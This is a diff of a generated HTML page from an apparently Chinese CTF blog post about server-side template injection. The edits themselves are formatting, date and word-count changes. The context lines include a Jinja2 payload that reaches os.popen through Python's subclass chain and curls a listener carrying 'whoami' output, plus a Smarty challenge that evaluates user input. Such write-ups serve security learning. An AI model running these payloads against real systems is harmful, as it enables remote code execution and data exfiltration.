@@ -358,7 +358,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:
-                    2021-03-12
+                    2021-03-13
                 </div>
                 
 
@@ -541,15 +541,19 @@ app <span class="token operator">=</span> Flask<span class="token punctuation">(
 <h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><blockquote>
 <p>基本思路：利用python的魔术方法找到自己要用的函数</p>
 <ul>
-<li>确定模板引擎</li>
+<li>确定模板引擎<ul>
 <li>修改参数，看报错信息</li>
 <li>看模板语法</li>
-<li>根据引擎寻找/构造payload</li>
+</ul>
+</li>
+<li>根据引擎寻找/构造payload<ul>
 <li>构造payload的思路<ul>
 <li>寻找可用对象（比如字符串、字典，或者已给出的对象）</li>
 <li>通过可用对象寻找原生对象（object）</li>
 <li>利用原生对象实例化目标对象（比如os）</li>
 <li>执行代码</li>
+</ul>
+</li>
 </ul>
 </li>
 </ul>
@@ -648,8 +652,6 @@ request<span class="token punctuation">.</span>__class__<span class="token punct
 <h3 id="过滤花括号"><a href="#过滤花括号" class="headerlink" title="过滤花括号"></a>过滤花括号</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#用&#123;%%&#125;标记</span>
 <span class="token punctuation">&#123;</span><span class="token operator">%</span> <span class="token keyword">if</span> <span class="token string">''</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__mro__<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">59</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>func_globals<span class="token punctuation">.</span>linecache<span class="token punctuation">.</span>os<span class="token punctuation">.</span>popen<span class="token punctuation">(</span><span class="token string">'curl http://127.0.0.1:7999/?i=`whoami`'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token string">'p'</span> <span class="token operator">%</span><span class="token punctuation">&#125;</span><span class="token number">1</span><span class="token punctuation">&#123;</span><span class="token operator">%</span> endif <span class="token operator">%</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 
-
-
 <p><strong>tplmap这个工具也是非常好用的</strong></p>
 <h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><h3 id="Smarty-SSTI利用"><a href="#Smarty-SSTI利用" class="headerlink" title="Smarty SSTI利用"></a>Smarty SSTI利用</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'./libs/Smarty.class.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token keyword">echo</span> <span class="token string double-quoted-string">"pass a parameter and maybe the flag file's filename is random :>"</span><span class="token punctuation">;</span>
@@ -660,7 +662,7 @@ request<span class="token punctuation">.</span>__class__<span class="token punct
     <span class="token punctuation">&#123;</span>
         <span class="token keyword">print</span> <span class="token variable">$key</span><span class="token operator">.</span><span class="token string double-quoted-string">"\n"</span><span class="token punctuation">;</span>
         <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/flag|\/flag/i"</span><span class="token punctuation">,</span> <span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
-            
+
             <span class="token variable">$smarty</span><span class="token operator">-></span><span class="token function">display</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'./template.html'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 
 
@@ -668,11 +670,11 @@ request<span class="token punctuation">.</span>__class__<span class="token punct
 
 
             <span class="token variable">$smarty</span><span class="token operator">-></span><span class="token function">display</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'./template.html'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            
-            
+
         <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
             <span class="token variable">$smarty</span><span class="token operator">-></span><span class="token function">display</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"eval:"</span><span class="token operator">.</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
         <span class="token punctuation">&#125;</span>
-        
+
     <span class="token punctuation">&#125;</span>
 <span class="token punctuation">&#125;</span>
 <span class="token operator">?</span><span class="token operator">></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
@@ -1078,7 +1080,7 @@ request<span class="token punctuation">.</span>__class__<span class="token punct
             <br>
             
             &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">42.4k</span>&nbsp;字
+                class="white-color">42.5k</span>&nbsp;字
             
             
             
